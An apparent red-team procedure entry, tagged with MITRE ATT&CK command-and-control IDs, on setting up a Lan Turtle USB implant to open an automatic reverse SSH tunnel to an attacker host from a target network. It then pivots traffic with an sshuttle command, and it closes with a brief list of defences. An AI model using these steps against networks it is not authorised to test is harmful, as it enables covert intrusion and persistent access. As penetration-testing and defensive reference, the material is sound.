---
id: 24f1574a-6475-48d7-b5c1-8ac6cfc4ff71
name: Setup-Lan-Turtle-for-AutoSSH-Reverse-Connection
type: procedure
verified: true
submitted: true
created_at: '2019-10-15T18:46:55.500836+00:00'
updated_at: '2023-05-26T00:40:47.594183+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
techniques:
  - '[[techniques/Remote Access Tools|T1219 - Remote Access Tools]]'
sub_techniques: []
tags:
  - '[[tags/Command & Control]]'
  - '[[tags/Network]]'
commands:
  - '[[commands/sshuttle-forward-all-traffic-through-ssh-tunnel]]'
platforms:
  - Linux
tools:
  - '[[tools/lan-turtle]]'
  - '[[tools/sshuttle]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Setup-Lan-Turtle-for-AutoSSH-Reverse-Connection

## Summary

This procedure configures a Hak5 Lan Turtle device to automatically establish a reverse SSH connection to an attacker-controlled host upon connection to a target network, providing persistent remote access for command and control operations in scenarios involving physical access to the target environment.

## Description

The Lan Turtle is a portable hardware implant that emulates a USB Ethernet adapter while providing advanced network attack capabilities. By installing and configuring the AutoSSH and SSH Key Manager modules, the device can generate RSA keys, copy them to the attacker host, and automatically initiate a reverse SSH tunnel on boot. This allows an attacker to connect back to the Lan Turtle from a remote location (e.g., an EC2 instance), gaining a foothold in the target network. The setup is ideal for drop-and-go operations where physical access is available but remote monitoring is required. Once connected, optional traffic forwarding via sshuttle can route all attacker traffic through the tunnel, simulating a VPN for deeper network access.

## Requirements

1. Physical access to the Lan Turtle device and a target network with an available Ethernet port and USB power source.
2. An attacker host with a public IP address, SSH enabled, and credentials (e.g., AWS EC2 instance running Kali Linux).
3. Internet connectivity on the Lan Turtle during initial setup for module downloads.
4. Tools: [[tools/lan-turtle]] for the hardware, [[tools/sshuttle]] for optional traffic forwarding.
5. Basic knowledge of SSH configuration and network deployment.

## Defense

Defensive measures and detection strategies:

- Monitor for unauthorized USB Ethernet devices on the network using tools like USBGuard or endpoint detection agents.
- Implement network segmentation and port security to limit the impact of rogue devices.
- Enable SSH logging on attacker hosts and monitor for unexpected reverse connections on ports like 2222.
- Use intrusion detection systems (IDS) to flag anomalous SSH traffic patterns or unknown devices.

## Objectives

1. Establish persistent remote access to the target network via reverse SSH.
2. Automate the connection process to minimize manual intervention post-deployment.
3. Optionally forward all traffic through the tunnel for full network pivoting.
4. Verify the setup in a controlled environment before live deployment.

## Instructions

### Step 1: Prepare the Attacker Host

**Context**: Set up a remote attacker host with public IP and SSH access to receive the reverse connection. This ensures the Lan Turtle has a stable endpoint to connect to.

No command required for this step. Use a Terraform script or manual setup to provision an EC2 instance with Kali Linux, configure SSH (username: root, open port 22), and note the IP, port, username, and password.

### Step 2: Connect and Configure Module Manager on Lan Turtle

**Context**: Access the Lan Turtle's web interface to enable module downloads from the official repository, preparing for AutoSSH and Key Manager installation.

Connect the Lan Turtle to your computer via USB, access the web UI at 172.16.84.1 (default credentials: root/changeme), navigate to Modules > Select > Configure > Directory, and select "Yes connect to LanTurtle.com" to link the module manager.

### Step 3: Install AutoSSH and SSH Key Manager Modules

**Context**: Download and install the required modules to enable automated SSH functionality and key management.

In the Modules menu, select the modulemanager, then download and install AutoSSH and SSH Key Manager one at a time. The Lan Turtle must be online for downloads.

### Step 4: Generate and Deploy RSA Key Pair

**Context**: Use the Key Manager to create an RSA key pair and copy the public key to the attacker host, enabling passwordless SSH authentication.

Navigate to Key Manager > Configure, select "Generate a new RSA key-pair" (wait 1-2 minutes), then choose "Copy the key-pair over to the Attacker host." Enter the attacker host's IP, port (22), username, and password. This creates a known_hosts file on the Lan Turtle.

### Step 5: Configure AutoSSH Module

**Context**: Set the AutoSSH parameters to point to the attacker host and specify the reverse port for incoming connections.

Go to Modules > AutoSSH > Configure. Fill in the attacker host IP, port (22), username (root), and set the reverse port to 2222. Save the configuration.

### Step 6: Enable AutoSSH on Boot

**Context**: Arm the module to start automatically when the device boots, ensuring immediate connection upon deployment.

In the AutoSSH menu, select "Enable the AutoSSH module." This activates autostart on boot.

### Step 7: Test the Setup in a Controlled Environment

**Context**: Verify the reverse connection works by simulating deployment on your own network.

Unplug the Lan Turtle from your computer, plug it into a test network, and wait for boot. On the attacker host, check for the connection.

### Step 8: Verify Connection on Attacker Host

**Context**: Confirm the reverse port is listening, indicating successful SSH tunnel establishment.

On the attacker host, run `netstat -tlnp | grep 2222` or check SSH processes to ensure port 2222 is available (may take 1 minute).

### Step 9: Establish SSH Session to Lan Turtle

**Context**: Connect to the reverse port to gain shell access on the Lan Turtle, providing a foothold in the target network.

On the attacker host, execute `ssh root@localhost -p 2222` to open a shell on the Lan Turtle.

### Step 10: (Optional) Forward Traffic via SSH Tunnel

**Context**: Use sshuttle to route all attacker host traffic through the Lan Turtle, enabling full network access as if VPN-connected.

**Command** ([[commands/sshuttle-forward-all-traffic-through-ssh-tunnel]]):
```bash
sshuttle -r root@localhost:2222 0/0
```

> This command prompts for the localhost password, then connects, forwarding all traffic (0/0) through the SSH tunnel. Expected output includes "client: Connected." Once active, the attacker can access the target internal network directly.
